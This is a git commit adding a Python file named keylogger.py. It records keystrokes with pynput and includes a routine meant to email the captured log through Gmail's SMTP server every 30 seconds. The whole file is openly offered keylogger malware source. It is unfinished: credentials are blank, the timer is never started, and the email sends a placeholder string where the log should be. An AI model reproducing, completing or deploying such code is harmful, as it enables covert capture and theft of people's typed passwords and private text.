e7722406e460199b70356c18d8b560e4aa9cf2ba
Ömer Faruk Yıldız <omerfarukyiildiz@gmail.com>
2024-02-23 17:12:29 +0300

    Keylogger

---
+++ keylogger.py
@@ -0,0 +1,33 @@
+from pynput import keyboard
+import smtplib
+import threading
+
+log="Key Logs: "
+
+def main_func():
+    def callback_function(key):
+        global log
+        #log = log + str(key).replace("'","")
+        try:
+            #log = log + str(key.char.encode("utf-8"))
+            log = log + str(key.char)
+        except AttributeError:
+            if key == key.enter:
+                print(log)
+    with keyboard.Listener(on_press=callback_function) as listener:
+        listener.join()
+
+def send_email(sender,receiver,message):
+    email_server = smtplib.SMTP("smtp.gmail.com",587)
+    email_server.starttls()
+    email_server.login("","")
+    email_server.sendmail(sender,receiver,message.encode("utf-8"))
+
+def thread_func():
+    global log
+    send_email("sender","receiver","message".encode("utf-8"))
+    log=""
+    timer_object=threading.Timer(30,thread_func)
+    timer_object.start()
+
+main_func()
